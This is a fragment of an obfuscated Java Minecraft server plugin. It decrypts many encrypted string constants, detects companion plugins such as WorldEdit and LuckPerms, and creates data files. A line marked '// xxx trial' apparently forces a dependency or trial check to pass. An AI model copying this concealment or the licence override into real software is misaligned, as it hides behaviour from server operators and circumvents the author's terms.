d("vsXjXjkBqCP/RJni9PdxT3dC1qWPviWqFu7u0F7gP7Ex+WRtqomAsPOOanZA7z8yKQ7jikhdVBFR7Ypn3Q4Wr5OEbKfQLEuo8vKtXbvCys+FCagrJg==", Vt.STRING);            this.io34igeng = (String) d("7dFkfnn5QT3hfSBT0nmami65X5SxnFHnzj2bsUp94gaq+zGuN9qXFjEdI6J2rjU=", Vt.STRING);            this.io43gdie34ngd = (String) d("hp1F9mJfw5KKQVsZGpFw4aaO6aCsKnD233i1wDpMBCWKc0fq9MkqdL6gf5o=", Vt.STRING);            this.yunyundg54h45 = (String) d("RawoS1/2US09dzotTBSNgGN5/ivJ/kI+xcGXvXIjJoFGuMfms7j/WS5sQTTNuA==", Vt.STRING);            this.iendoi34nd = (String) d("Kz3MLrLVo6CcMBZ4+Q/wdQNdPzNnU0j5Q68S24PzK4NlSQI6", Vt.STRING);            this.ifendioafepnd34fd = (String) d("74WG5Eq45mgntEe3PHne6SyEIYeJiNq6mWmHD36KXw9Xxfo7vZwZ/6PLhkglTZ6J0368xTA7VGjPj8HM2GhPzXHT3jGBusxc/SwP4PzMNOPnoDVNxiXZ3Dg=", Vt.STRING);            this.idenpoaidn34 = (String) d("t8aczWOS2PIa5ljrX7td3eCEJRh0DrKlYvzfMGtMYhsOeirlZ3hS9mRXPbR17A==", Vt.STRING);            this.iepdn3idn34d = (String) d("a3ymWV1Aqw7gKbR4w2eUQTOJnoqRNmrhSMk3crVNnAU25Q==", Vt.STRING);            this.ioandi3n4dy43udn3pfd = (String) d("CM4t18k1ktd8ExY7k/VQPuMICZGn69pNO7ccpvGzjOPUL4XMw76lsF8=", Vt.STRING);            this.fipdenao3idn34ydun = (String) d("nb0CS58/S8CoMrIHE5SXTwrdJ74iid9LmEEsu9ctkpDnh3Txncg0PQ==", Vt.STRING);            this.pd3ipdn34d = (String) d("sycw36f9vTE6quLfND3QnJeEVqjwa2L6VazebUs=", Vt.STRING);            this.wfonvdawfydunp = (String) d("cK2F6SUt+8/Ehyg64ArAFq2/vNweASl9nQXOaqY=", Vt.STRING);            this.fpiednfpden3 = (String) d("oASlR2McD1ztte65Phz3Y0iUDt+Ej+GOdbZB45U/", Vt.STRING);            this.fdon34d43d = (String) d("jcSXEW3Z3scFMtXkif95CLUN/GcxgRgHoptcX5pOI7CFip5LHw==", Vt.STRING);            this.ifpndoi3nd34 = (String) d("zvNpIRCDaVpQNJsZIrVBHZdKIg1qpI+gtIlAtatoOm2r", Vt.STRING);            this.nodyu3pnd43d = (String) d("l3W1cavhuP6SVA5rfbOnZLAp9p8lpqsafOYnN6yLISCrzNpiu03xiAWQGfok26Xvm/agO4BU7f2789vVttRLajpau0rDoYre8Ei1bUEcrGfwEzgsnLQb+qX+5Wltzr0msKetOZy/", Vt.STRING);            this.wfnitfwtd = (String) d("d94RwwHVPw6+tZdPuNlEx1cQu8cEnjGVpWrEFeY1Us4g1X1jrcxx5W1HPyX5/IdQ9XVeoFO7ht91EDY=", Vt.STRING);            this.nydufpnbfpbfpb = (String) d("PWtfnR6Q7l4+nloo1d8g2Pg57qRyti9z/1iQMk8c5x1GBxWLuSizJTqm8DcmIO7Pfb2g7Q==", Vt.STRING);            this.yfpdnofayundfpd = (String) d("lxu4A7Zbr8szq2vaXM52yHSYegXhsGgnaLanWf6XnjuUcX5xsR4ICEUeNaBHPMBjwjvbQ6d6TD1h+V+COU7uT5k4VGG/gBzCaA==", Vt.STRING);            this.fydnofyapudnfpd = (String) d("JlqbmQSb3UJ2ItwvgUzRMHGfDlYu66zdcdI/LmqFTgAdmhGSYY0xWqfrXcyirQlxodvxdHrkeQ==", Vt.STRING);            this.opdnd34d = (String) d("K3fCTLSkZuN7nLINOiqC15/0ICa7/CSzHvkBCzQVHkBmtzo=", Vt.STRING);            this.ipfnedfipdnpd = (String) d("2HH0Lqeg1p05U7QG+lnXc7Hf0KRNdN0Q8YJ1DK5BDXYLKsx/K8KaqPOIt/zo", Vt.STRING);            this.fypdnafoypudn = (String) d("HpklLmrdCWLhOscHzewunV9E9aK3CUG1v2Abok5oKO0gYjdjI6i1uw==", Vt.STRING);            this.fpdnafpduyn = (String) d("susRTL86FUFDicxc8A+5juIsQZ53EZ0vN4Rlnk8+CODYGEwM4BOlQjXl", Vt.STRING);            this.ypdn3oypdun = (String) d("rHpoGuOk4Z7blXXHi0S61q6ln8zw6uZkzSLl/yWZ7/DSnqkj36S3rw==", Vt.STRING);            this.nyduk34 = (String) d("s23Vn9ImJ6oDPIjg1hxc/5GBMVLB0BcxVrVJQ3RrFqlQWFgUnhnaE0U=", Vt.STRING);            this.y34udky3d = (String) d("VLsLVAkfMihujNn8BBGu4Mz1mlRMmUASprcyj/nkjE98bQ==", Vt.STRING);            this.ydu3k4ybd3pd = (String) d("6x4EmIoRASFTC/mdKU3jdx3KBvNrYs8Pyvj1PHfdAcazE666FJt+yUrMY9Xb5ldZzA==", Vt.STRING);            this.ypfuwnvwfpd = (String) d("B/UW7I0G8hxOJJ5L4+58rZFbB8439W0+xVIakzu4q7CeJH9E4FSIDKegCA12N+yEkXFgnhw6O7LCYOxCGd1ArJZvfmNClDb8H9c5wUbI2PWBgDlOAQx6Uyj3orWK+4WeOzylzX7LWXPnD0rNnprsWVO3kjXck7Yc3a9RZ+JO", Vt.STRING);            this.y4dnyfwudn = (String) d("XjtnjsrwEqee6cpgqTAh2QLn23+wsatZueV4uh5C5aNL2wyry+K6os+vMyC114J5uH3/993Y5VPu4B3iHxIqxgGH2Kpla+Tuv11LDnfdM/ckyWCzQSRWnGbvPuUxNQ==", Vt.STRING);            this.finovayfupbnyfpubhofpubnfp = (String) d("5oYGX63ATS1r/uTujILUPsfEI6rfhPHfsjhAnLNbnXyZxjqxeG7D7/8gwvA2spHiAJ/JQbitBVMSFK9cZUf2plo0NkFx/OzjuNvMjdWpYYb1FNS+5xe9kcwnKinn5iIi8EKNDJM25QdbNmQs", Vt.STRING);            this.fpybunyu43nb = (String) d("azN+qWTyd9FuLJSQmTdALOX/wSxI+iHhrcD5o8HuI3BtDEal", Vt.STRING);            this.pyndy3upnbd = (String) d("EFfsipkMeZGBfjMuzgrb5Kq734kITld18oIuRdBAJU+dNf4UZG8kr/OA4zhYKyhvarOiHUar", Vt.STRING);            this.ypu3bnyfpubn = (String) d("XLx1pK8xnNZtmtAwcTNNfcc4HWxcWNIFBBMKoIALNobWuj4f", Vt.STRING);            this.ywofpdnvoypu = (String) d("F0FDyPyBstDA4NeGqr4//iAyE61ZdY+lYp5O1FD6lZnic5ub4xw/QNM5fis=", Vt.STRING);            this.yvunoyup3 = (String) d("WqCpuggnl2vzkB58lywIRmzA6lfXcPVtC/0yDP6IO9UpPEHyhKFJ", Vt.STRING);            this.nytuwfntf = (String) d("V8nXRALKuRaJNoaMDruZZfIBzrNoxY9ctY5jcvG4C/FLmPk=", Vt.STRING);            this.wkyvuwftnwfyutn = (String) d("+2FVEK7+BtKCTqRkPnWAClBMcRC6+lE9YPZvQJDPD4U=", Vt.STRING);            this.yuntunyun342 = (String) d("GP7DiZ0bsUIllNazFPEr5QhKIoRRpnVODu7qvQh67OA0th3kdjkIbhbYzkg=", Vt.STRING);            this.yunduyn4 = (String) d("wMtcG3cCql1UfhNC3WIw3o5ScZbM/2pT2bdY7cxA8Aj1suGOXa5Mfg==", Vt.STRING);            this.vkdyunt = (String) d("dhPum8DfU0a1aLbC70bu2uhvRotXPZ4MN2s0FNqnIBVs8VOI5vyd", Vt.STRING);            this.ktyunt32 = (String) d("OPB+2Rtl7V+QeYtiC7zJ1ZkxTJF56orHLgjroH+MmVmdcEdn6weu4xG6BNQInz6c", Vt.STRING);            this.ydny32u4nd24d = (String) d("+d0yvND6uk2QpRWWHrLL/LRHbJrg+TlHPPx+/DrLMtr9Vq7BSZ2r0/SAcEADRGH1cM9HyEh8jAoz+XQk", Vt.STRING);            this.ntynu23nt = (String) d("sLF61G/iK+EY+vZEt9ES35v07geMeGdI3je7Lb44dhTTwy+njJiJZg==", Vt.STRING);            this.vyf3b3 = (String) d("/SEer0nzBi2uNC4XW0y33+ZEt5El9OvU1ec4dCyDY7i0FEgFDQ==", Vt.STRING);            this.t2u3nty23unt = (String) d("Kjex+9fnXsll06kEumV0Y9hG7380CLeAa6n9Pd9OszkcYp6AVgK1ymkvMIYA2w==", Vt.STRING);            this.yfwunvtyn = (String) d("AGxDwvtvGnaD/rIvoMzPHxRNLkZ3hiR/Hl/7m1+zPrlEnOca3dzbjxN5P3AO2SHtqTPNcSj3GAIf", Vt.STRING);            this.ytunyun4 = (String) d("Ie/9diS1urPYCCHFDzuwV+oRUn3vbxZ9LOokbySz7BE2wQyThzh6s625kSh3GznpHHNkMjwNro1Nobgwd3qq4MXXHlSM7zN2ME54ag==", Vt.STRING);            this.ydnyu3n4d = (String) d("TUHzooTsAuHszW3WADpONMEmJhiuhxbOLJrGi/6HDM4p16MKgQPoCqkuT7E5Uin9TfnqJBv/F+z1BaAV4g71p7XqfdSH0jEYUw==", Vt.STRING);            this.ny2u4ndt23d = (String) d("34stYElCBGrm9xZgatktwQTKmFeqqevuUojMmCTPcqZ1JP6beDg5A7tUZIl9303uJZNilpWhgkFvdg8LobES1GI=", Vt.STRING);            this.uydn2yu3nd23 = (String) d("hhGdhAGbuVYOIQP/QFp81FKhknSIiPO7rPq+uRtGNGRaeZHjBQYAgEE426XeO+E=", Vt.STRING);            this.ydny3udno34yduhn3d = (String) d("bt1TE4G1z7ZLMMi10z9NC1algdBZV4ua0A9SxJYG/dDJccSzZCWmqg4Xy6fRG/A7vg==", Vt.STRING);            this.yndoyund4 = (String) d("TLfVdvRjg2E71oBA2guDOz+5XOVyfJPKz+it/yWzXr7R9RxKo6bu7g==", Vt.STRING);            this.udny3u4nd = (String) d("GvFNWAjGIiujnhqlr4lbLvvWhNHvU6RK0TzLR48ja9udDk9CDaKxWtIRSdtQiFvjmvLF0Mtp", Vt.STRING);            this.dny324d = (String) d("9cpseIjFKHtK4g3E39Q5DcPEqzLtipGAEtiY2Owxa40jUpSjoh3mCW0k3qbEhA==", Vt.STRING);            this.yutn23 = (String) d("LsYcJ1vsBa0d9V/OfmU2iVPr4BbXQOku7KYrA0AG79LDJMbA", Vt.STRING);            this.dy3und3u4d = (String) d("KDVCmbPkTyyn511r+HRAPh8XgEafHiHJY5TVYJyZ6+cZfG4km/p4og==", Vt.STRING);            this.tyun2 = (String) d("fhUSCFdKRvfda2JOcqGB8XgN3ZksoCrEq70CbnodgMzKGuvJ", Vt.STRING);            this.ydun2d = (String) d("AW61HaBIklcMcWYMN9RuArfddqkncA8xA4hUy2+F82OCYNH6soAKsTA=", Vt.STRING);            this.ytun23yutn = (String) d("sGENo4OWZMSWj8PQz/1OdCVjVFb+8CWro6UReKq5Ifks6mrK+EMxjMQm9X6t6JX5wQ==", Vt.STRING);            this.tyn23yunt32t = (String) d("g/fIv75a5zbo5jl9UKKicChx7ickY3/bK5YxboriaaFgPWFubJvyot1wucwF", Vt.STRING);            this.ydtun34ydun = (String) d("WARvliZXUafPi8AvEGDMx4VeObwRU47/i1tSBznullmAoauwOGldgfpHNn9rA0xgwv/WVsCjdjSc1vliK236Ig==", Vt.STRING);            this.tnyu2nt23 = (String) d("6PMSrUZtLkwcbu04oub9QNMMeLos/0EcoZ9qVVJr6mEKomo=", Vt.STRING);            this.ydn2ydun = (String) d("YGysthxXLOjl1OSFehIUrgRk7fiDwmAsJhtNrcxR7h1LU0Ca+Nc=", Vt.STRING);            this.dny34und = (String) d("p6reCvYMStzynWmdr9e/77oXlm3k2kjjVe358TGY+gFOl19WkfRPM7fcTbumW8lr6EjoUmczOukgiH2DW12ibM5s1h9N", Vt.STRING);            this.vyn3vy3v = (String) d("sDBdwn/Kc+PjYTbsdkIVTvvK4UF+IrS+SUkS+0cX4yyPZPd8YBxcXWlaz5pqBuGtstWgqkaS18kqja23QL8=", Vt.STRING);            this.wyunvywufntd = (String) d("wpalpYTII0ZexO4WQ5Ym6FtQ9xUcNVek5IwNsdRPG8C2ktZlCC/TMPDpdi5ZKblpf3lJJgTlAXo=", Vt.STRING);            this.dyo3npd3d = (String) d("tpRgCnIJUUN9oemnKZglSxj05T+AvHT6UWjZhL3RI16QNI0B5w==", Vt.STRING);            this.dyn2yudn24 = (String) d("HCNXTs11uCUSjMXavhbkr7ns7dsT1syIjbmzgnptDPbeHX1bqg==", Vt.STRING);            this.dyun3ydun3d = (String) d("M3xenV1VGpc2346ox2OjYhxEv53rvLYIYp/gM8pqxz5/roJtxw4=", Vt.STRING);            this.y2un34yudn234d = (String) d("JgnpMhUL2IraNOzdABBnbqQK1h7PY/e9aJbGSxyXI5l9//jUJK0=", Vt.STRING);            this.tyun2t = (String) d("Dte7dtoaTUA4otCKMCQRgsBCiGR35rLSj0Nqv2dRL63PYhULfw==", Vt.STRING);            this.kd3nd = (String) d("VH+FPYjIh9qvzMX+tXTtX4k9gjp2fOa5Uym1UY1MhGIB19msog==", Vt.STRING);            this.dny2udt = (String) d("WGLOUfUxbTm5l/aAJGnQdl2yrwc4aaAm8XXgljl+PWqR0HrDlmwe", Vt.STRING);            this.ntyu2n3t = (String) d("tkLbeMo1mbYK5UEOYxsq6EJ6mcIUNRVuGlodJ03Yzw2/sWdySYnzK/2OcQ==", Vt.STRING);            this.kyut2n2u3nt = (String) d("6R2vftoUW0bdvpmTPrUDa37x62LHAmvO+Iw2ZbE/h9TwN1EjQT/cN7qFQw==", Vt.STRING);            this.yntu2nt = (String) d("BF5xQdDtv/c7LGxgB+vKDVoCpKlW06Y9QQ6/iJ8NdEX8iorLHH61YhvImvvvF/j7HCs=", Vt.STRING);            this.nyup23np = (String) d("CGKESi4vTjcnNtbX9ldPMl/SoSCahZipER9l52dzlgOkWnjjauR6zohVrAMQN+M+Um78C3aYpOqqtqVEDpB7kzo=", Vt.STRING);            this.tn2yu3tn2 = (String) d("jUhA4Rua1bGKl+TpaouD0xfvQsgTF6ncGb1te010XTm8fnzeT+AaIg==", Vt.STRING);            this.tn2ytn23t = (String) d("vRlGtkZzbXGiVGgkwzOzqVr4S688WP9lSZloYWRmXXYukZvLYD9vP4Kn", Vt.STRING);            this.ytnfyu3ndt34f = (String) d("rhJBaoGnOWN8TAcsQT6FEiyPikyU+HEz+7btrBl311+ilabd5vCQveuYj5XN9Cc=", Vt.STRING);            this.tuyn2y3utn2t = (String) d("Qs2KEWs2I9OrN76rtBAe6gNE5Aj60u/iVh02psKelhv8BnEpjZ7EIWLW5/wnJy3NNFD1lGHefkdkbY/kMw==", Vt.STRING);            this.tyun23utyn23t = (String) d("RnyWxVIa9AITI+zb6eYd/pIlm0Je4qBu3+q89cLC8vKawGSYJePnIvRXwg==", Vt.STRING);            this.tyu23nt23t = (String) d("8P3xrhwrebjH6d1Ka2QjW5vukGkNsBhQ2fVgGUoBYBIC4W0=", Vt.STRING);            this.tyn2fnt2 = (String) d("FgFRPrjC2jFZEyytELuuMO/zamhRlNMWJPvkTwv2kRsYyHuY", Vt.STRING);            this.knde43d = (String) d("kke7woCl7WOJvw+IAZFiT8Nbfap+SUp5JxxYQK/VGEM=", Vt.STRING);            this.ynvkypn3v3 = (String) d("M78IBiyzDunsI28OacBMvZj7CXqGfOB9j7C2DUgsNqP8a/Z0qUt4FDfQQJprDiEEZPA6hO5KxiRbx2A=", Vt.STRING);            this.kientien2t = (String) d("cKRjtnuL1vQlnbi0IRGPSZR/6phDpTBtjcAfr51XJ/4pVDbmWAXVV/oeRbv0gQbA", Vt.STRING);            this.tyu23ntyu23nt = (String) d("bOg8AieI8miqvjHY1hnz38OwyEnhuVdKQvrN5PBw9j8/L6h1HQJBhT2pdf5jn30=", Vt.STRING);            this.tynwdy2d = (String) d("iU/mJMoRtZGjD1j6XmXicWKTLP+fEzfqY7CzsePlKKO1eJBtwAUU6w==", Vt.STRING);            this.uydn3yund = (String) d("B+Bh058bseEGadCfs7sbF7CPqp+AWXNdUtgdikIX3mv9C5r0A/xtH72gNLA=", Vt.STRING);            this.yuntyun2t = (String) d("JRyj1/nm9hLUGIlAKp/QrS82Tq3gPnr5avc2okJ7nM8=", Vt.STRING);            this.dyn3ydun = (String) d("j4bRzPevTP+aB1R+Lg0HFg5nj9HmOWJoHK3xA2xHgg1l2H1i", Vt.STRING);            this.ydn3yudn34d = (String) d("aAe3dJh1EX3q8stcSOVbnA7mt/bBmxCsauJnqUeDYxAS3MrAw4eOeQ==", Vt.STRING);            this.dyu42ndyu432nd = (String) d("WDm82iqXI2ITw0lzXI4Psm2ffI8tOqIwOotxzlqruOlNyva780ep", Vt.STRING);            this.fuytn2yudt = (String) d("f0N6hKrbBkkQwNs5dMkaCPpn8Rcry/FeJNOLQY1LqqQus31icYFD4tRx/ibL/Q==", Vt.STRING);            this.yundt2yud = (String) d("4EAdq1qWEtszl2wlVw78G7AxRXhAHH2vl8PMztYNP14=", Vt.STRING);            this.y3udny3u4nd34d = (String) d("4SkWt+hcPzh6oHN94ubpIdmw6QnQHgQIZH/9J3KUXhvbcmWWWDBLjnXVbmvw9olJKQ==", Vt.STRING);            this.yundyu34nd = (String) d("sqZdRa01bicwYCk1i6hJAO5UDYOa3gHxvRqEK/XubhAT1e2TvR5g7LmhLzfdmJlYbdyKI5V0G28I2Q==", Vt.STRING);            this.yufdtnoyupnd3d = (String) d("IJnVKlQiRqmXg6BgHyq5ESwlqLZQ0LEH8AgSnQJozwqNpPN3dd4IiBgZbzq1v28p9VRa1WxfPFhGuDIKDqJfJ0k=", Vt.STRING);            this.udn3y4udn34ydu = (String) d("OXuw3mnlA1SRB45HpeijPAtpGW6gGVY2B/OEdlU1l2B3FHj/AoP1m63C2uH/qfoqv8f1D4McKQZl+FkjacARa6PySFxas14=", Vt.STRING);            this.yudnyu43nd = (String) d("A1L0omXsq8TufrmC9C2FbWCrUocWbk/G3T0MtB4NBOt2ObXi/lnaFLhOUQE9Bb2L4QyihiKXsCW1Nzh+3OrccUJ4WnmowMc=", Vt.STRING);            this.ydn3y4d = (String) d("rMlGinBb00DEYNSE+pAFvrxecoHAcPEji9mHqWGvAElbS1ubvWxGog8z+4toLcZJIubnUG7Xv1INxRBm7U0fHE++og1MXBuZ6Pr9ZlVSMUWu", Vt.STRING);            this.y4dun3y4udn34 = (String) d("uOMA6YtDhcHcUw/1t3CbBGyyqu4T0o980vAtxK5VwsPKt+mQ8jwg", Vt.STRING);            this.dyu24ndyu24nd2d = (String) d("WxSc2gQiip1LZvwOasZWIM0wF+vH/HtSLi71L8X3BLYVcEu+/U5M0EqNH9wmb51SEg==", Vt.STRING);            this.dyn34ydun3d4 = (String) d("upujfp37MqND52LmVmZzyEpuFSQ/nNWhTegzkyHo2FGPcw1qHSSgX6JjEO71THTVZTS/pYw=", Vt.STRING);            this.udnyupndpd = (Double) d("9X/AJqcP/ADDbbWoOatBWBKpi/AObIevHnErGEaNSg==", Vt.DOUBLE);            this.do3ndyu3pnd3d = (String) d("kFslObLWtt6X6vXV04vDABGDYo+vfG2Z2JM7xI48bqI=", Vt.STRING);            this.dnpyuadnyfpudnfpdfpd = (String) d("Wj6cmGMhxtVMz2iy13Z2mnN3d9Z+wJNnVpSIrdOcXZB2+BF14aXJKKXZcOwTIkioDhqIkdbOm/fBKmuWGi+e+TvDf8nERou+K1nbAHm3ON1XffqLjXNpc8/yh7SdjNxFYLxnoaP5sPiH+Ro/vdBK/ANdpqrW98W8bCbdYv0arnAFKHVdSFg6weNNlcmxQlcH2TvMX24a22GcmF7sT3LT577FKZHp8M4mGUZjI0fP33mZRXAyj44s/y4hfyjSKoIz+noJFPHlGyr3IaRYh49oN+/Iv0HKGMNQvQCa/Hjv6xX0w9aO6WtwJWztX6ZEKmjN9lAkp0eASVecK+98pslHY92CDRK4DJm57dRBNhSUBR3EcY2sg1zWJvaLTrs8WIg/8ZctkJNCHAYXstbMcFJo2h6+utHxZR5Ov1N3qgGYVLhkl7rj09LFpbpBu1vJu3RH8yzzzi/Gx+IajsrpHkkkVwng1QSTeogfn3U7Iw2aHNFZu6Xuu2gZbn5EshHdAWuep+vwunLsL9DE715hjPYjKeEFP+sb63/Vn9zFWQLju5Qu8aSG/BKPxzEdA6PzVc8CbG2IYZZFL+8D+7B585ISJgp/kSdkbVlRVKmecZkGQoUlr8rv802IbQYK62ZmuqbahjpDZgR3SR7aMoIXqDpGlfPB8+N5WTxVC5c6NbXF2pv8wKfN+th64zqjGmFh0sDQiocmygCwkqCsrOQEqHiGhnooHIntKmHa6J14FNpMwktLXkrzQyu7zT4mUiGUr78El6eOc7/vzAMIihn/D9viT1LTA3T0S2UwRP/9xKIRJW0Okd6YP9WjUgJYRJTDftnzDfFgauPpxfMsNMn5o4xyDbETrdlS9OIuWp5cOyWYk+7lTnU1VjRs2wRmUml8WrF832LNuc1ISvqGg5a2/eZqcEczyvIr4Ofgzspp2ZmdhMvHw7yxdPiSB+bbmyQ+z0cBvWLHJu7ngdTs7IJvyVBwEeBpWdtasW2im7rzm92HlipEjmsBRuxM1FbhrTw89/L2xe9oazMrlRBJzH/V3VYUaAJCI1ZtTZ4utgG2BpiY9bXaSl1LWtlpC8AA7dDk/Miyp9zSJA==", Vt.STRING);            this.dy3updnyapudny34undh = (String) d("RafM/46sBcQ/Vxd5Bx3DiLOeiVBukRR2CpEGjULp6xTwkSIP6rI=", Vt.STRING);            this.dnyu3nd3d = (String) d("TgEZBxnjFw+VpLGOaKpYJkccUAxNbhUrRcrMu05eZ7gUZ4YMrAvi5Qyj1REthumTLZKNdwtqDuMFekA1NHOPtIW1X803rTOGPV4OM203Yj1+wX/BVFjvW9LwbxHdr/6tjsMNbJU4YZwfxU4WC1KY", Vt.STRING);            this.dk3ed34dyu3nd = (String) d("8SXnBJn7/YoaVdiTx71l5DoBdD0wuk/g1P77IEaLI/Q63G9ojP02GJJIfhGvvCMHueh3fpu5bR9bTGh/iK1p8Vci5gh9SVdspESqUvsAlNan/MXQ3bnfWO7LrQ4/FCDS", Vt.STRING);            this.yudyu2dnyu42dn2d42d = (String) d("TDwDh52nNBiFOA95UVLbyFUEdpwZnR7U0MJSFUGAAjKrUwWafTbV6hff4K1CFK9ayelh8QDm5Rob1TuCEkaWOIb1c61j0VoKwDmzWP3n3j1Da/o=", Vt.STRING);            this.tiewntien42 = (String) d("i6S5T/j+FQhJal+oyrnt0VXgchiIqmJIMw1/1NanzMTLT1JIf3JORpBrSzIyzv2ZDCVGtRXrP7rxKqZhM/boi2zd0NLcCGoZQONCTHOzjlGm7AW5c9wcghV0O6uPeO/35tL3jM7ybp9NL/4SqfSODMqFx1m1V2NE/V3jmMZ6eKue9tfrDdKM3h4n5NU5jeIfR6k5mbQaikB7HUBuS1NTkTGYpfDWnT9zTZ55xZhn1u93F1A9fePkibF2e6r2T9KXBdgk0lF0iUxBNqc/mHBA72fQ9sBjKvPpgwtZPWp3S9cDMn6zf752k0LV+WvIFdSpCDk6pWBbFYdAKDmGiAyPGxfAWcuNNdOA2s1PSoysaAj63A6OvhAvaJe4BukFbe8za9mOjrlTt5KgfotZC762AN0QV54VkFyB1iUdmF62m0+c0rWfx4503sKgEQEFtMDTJ22DUQsaIa9ZU3s/lf+CGZlmoDFkbFCiGwwnf0jeMpeQYaj7s9m6HkfpCFjTCgkgD8IKEMlr/lbci306I5cqfsIFkkBJLZJ5phgRNDDaxJ5JXSXnWVLbCWcy3E3vBQS8jWiGRjabuGjQRF2MOo6KCQyDDYovgy0U+O7vbQgQvP5hBzcGf1Wvkw4rCPHS4Vkgm9RkdSQddbSgLj5J9RZhVm6P2QHjCuGLn+uaaFKeZxnQ914LvfMwmTeb0DlXJUqKk9UF7qyU0oiXpzU6zIsiPVxdDUMuPi4QK8ZMkTOc/U2JcUv2tIfBpGttAtCcWMntR4/JcMRpDQyp8pevk3bTwzsE64qUJjXAYHEswG4Op6FxsbJdt3Sc5Ez0JzUTu0KzCK9hIBMs/GvZal9tiEZnFTdiR6yfbn554GFfyyS8TGwXVtLiCKdR/xuOtQcAsYMINzZj4+fkWxUVh1uG6ifuKXGPatFnojDbjFW9urPKm+qKBpp4H4iP31wMOTw5cehpHpRd3pxFyaPL2TVscju1DgmTEDr26+Xog/FYeJDPTHr6cIgqCNtIFVTsrBPANsBdpspeloupGQ+zhElhDLqudBgWn3Hq60rPf/f1gPTXaGzsRCocDpxwptP0NcRNy+/aSIMqHzxSCYIIJowCT669r99vLduzVNkntD1dSxgVscOviM8f1RKn9QWxESNzo7S2YykkC+ToeDPKSN4GRYUIJrOx0rRUPWto4M93dqPxN84ZNGGNAj8B2THebl36yGxct8fpguCRLNe8TKCmpeT0fmr51Xx0qZohui3EHgjAqObr13QskkEM0D2Ws5il5TjlD2lTVwD9u0bFHMjjMesj5IBSO4fRPtQt0EKpAUGP800RPDFtkdf7oTApHKmtWkJffmfW4b/CoeYs5/DfPB0qItAt9DukwskyXTd9a1LPTGcIfgOCk/DnPIUk8tAaCfjDHJ+mMM+v3/9EXwk2But0sUspa2OKMHtC1zcCKw==", Vt.STRING);            this.y23u4ndyu3n4d = (String) d("tKPiMGpnkt9erdxDKMumuvm7EIX709gynlKRiI4GAXlwo5k2gcQW04/Fv66CANR9QhwcWay7/+dF+UxiiRk5RDAclUiDhA0iIakYnEe4CgYCTl7vLuEPszVwuhVJQ32l7Y5UeV6K4tsupmgzcScJZBVkHLzGm+YUzyYkUYkhn4D7Tn7kTDDpcWqDzoybuzIbtG4+ecKBmohgvsNSlCb0N3a6hW0CwYtgFSBvEEC+uftPD2SszEN1QK/srH/X0+9G4AvB+xoLm7fcBl8v55yWWWCZZK2qc/5aGpMoV+kd7Fj5NC51IfxHnS++gU1X/47yYVLE93QA8ewOgo4++/QLzNW6R+f/yVY/vJ1JWR2N/A==", Vt.STRING);            this.dy2un4dy2u4nd4d = (String) d("kkC7cAqFWfEtXiWyDW2M0XutyGrQi+30nRIiNPYRg0roRoJgMskGFfTlNBjKT+c9CrDoj78tbuJgjNPlrCQCsV4hDQ==", Vt.STRING);            this.un324yudn243yudn = (String) d("uoF41g925oXJtvZqJi3Om1cx2XVUk4oMK9QGdhbZmbJX5wCd3h/4/NFKV5mO5g==", Vt.STRING);            this.u4ndy24und24yd = (String) d("dLXkOKtuMnkMSSznhCSZ/NRcT6Pl/r9aCq/aruei5DfKIWLLdYkwE2j2jY9h+oEoCKhybBpTq8ECAKMneng=", Vt.STRING);            this.yudn3wypu4ndh = (String) d("l86lDr7DV3nsi2Ocw6KLRnjBrPIA713ELhT62jU5D0eq3YHQzawi/g==", Vt.STRING);            this.dyu2n4dyun2f4 = (String) d("ZLRqjY+//258Gc129lgB7xJ+lhOeE6GiadxDL0nO7SNn3C31fqcn+aM=", Vt.STRING);            this.y24und = (String) d("qNCoGlLxFazCnqbC+qPkVwpDxo+1i/01cq2tAGSlstqgFwnUwzlgy7UPWZew51FFKA05UBcrmgQSeNYdiNojzKlyeg==", Vt.STRING);            this.y2u4dhyu2nd = (String) d("llu2VNeOU3zhiOOyLaYxBTvcHuR0p5luDHyQNcv+F+TTs0WaJSjqtpHO/crHx+9GWhNxb0uP+adPTcjwteVpg6iAOOT/", Vt.STRING);            this.yn23yund2y3udn = (String) d("6tGn1MUT1y/P5tpfHurExjvBR5CgC7agZiqa7O6mRB/GaRJccPaEgxH1kntvEkMZ0AfA3Ln6Y6aqL9FRWw==", Vt.STRING);            this.ydun2ydun23d = (String) d("Q7aUskZ4PB2ighVquH72rYXX2SILOrODJ0GD3m7dkcCOg1hJS8zrmA==", Vt.STRING);
        EnumSet<EntityType> ktoyfuntyufnpsrvc = EnumSet.noneOf(EntityType.class);

        for (EntityType type : EntityType.values()) {
            Class<? extends Entity> kcoyufwhoyunpwcsr;
            try {
                kcoyufwhoyunpwcsr = type.getEntityClass();
            } catch (Throwable ignored) {
                // If some fork/version ever breaks this call, just skip safely
                continue;
            }

            if (kcoyufwhoyunpwcsr == null) continue;

            if (Enemy.class.isAssignableFrom(kcoyufwhoyunpwcsr)) {
                ktoyfuntyufnpsrvc.add(type);
            }
        }
        HMsetnoy2un2yundt = ktoyfuntyufnpsrvc;

        PluginManager tyunwfdyunfwd = Bukkit.getPluginManager();

        if (tyunwfdyunfwd.getPlugin(dyn2yudn24) != null && Objects.requireNonNull(tyunwfdyunfwd.getPlugin(dyn2yudn24)).isEnabled()) {
            WorldEdit_Installed = NEW_VALUE1;
        }

        if (tyunwfdyunfwd.getPlugin(y2un34yudn234d) != null && Objects.requireNonNull(tyunwfdyunfwd.getPlugin(y2un34yudn234d)).isEnabled()) {
            WorldGuard_Installed = NEW_VALUE1;
        }

        if (tyunwfdyunfwd.getPlugin(kd3nd) != null && Objects.requireNonNull(tyunwfdyunfwd.getPlugin(kd3nd)).isEnabled()) {
            LuckPerms_Installed = NEW_VALUE1;
        }

        if (tyunwfdyunfwd.getPlugin(dhnfpwyadun) != null && Objects.requireNonNull(tyunwfdyunfwd.getPlugin(dhnfpwyadun)).isEnabled()) {
            ProtocolLib_Installed = NEW_VALUE1;

        } else {

        }

        if (tyunwfdyunfwd.getPlugin(kyut2n2u3nt) != null && Objects.requireNonNull(tyunwfdyunfwd.getPlugin(kyut2n2u3nt)).isEnabled()) {
            GriefPrevention_Installed = NEW_VALUE1;
        }

        // xxx trial
        SCore_Installed = true;
        g5 = 10000000;


        File tyu2ndyun23d = new File(dy2un4dy2u4nd4d);
        if (!tyu2ndyun23d.exists()) {
            tyu2ndyun23d.mkdirs();
        }

        if (!g10.exists()) g10.mkdirs();


        this.g16 = new File(tyu2ndyun23d, un324yudn243yudn); //viewOnlyChestDatabaseFile
        if (!g16.exists()) {
            try {
                g16.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }


